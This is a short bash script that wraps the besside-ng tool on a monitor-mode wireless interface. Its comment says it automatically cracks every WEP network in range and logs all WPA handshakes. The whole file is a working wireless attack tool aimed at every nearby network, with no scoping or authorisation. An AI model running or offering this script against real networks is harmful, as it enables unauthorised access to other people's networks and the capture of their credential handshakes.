#!/bin/bash

# Use this tool to automatically crack all the WEP networks in range and log all the WPA handshakes

if [ -z "$1" ]; then
    echo "Usage: $0 <iface-monitor>"
    exit 0
fi

besside-ng $1
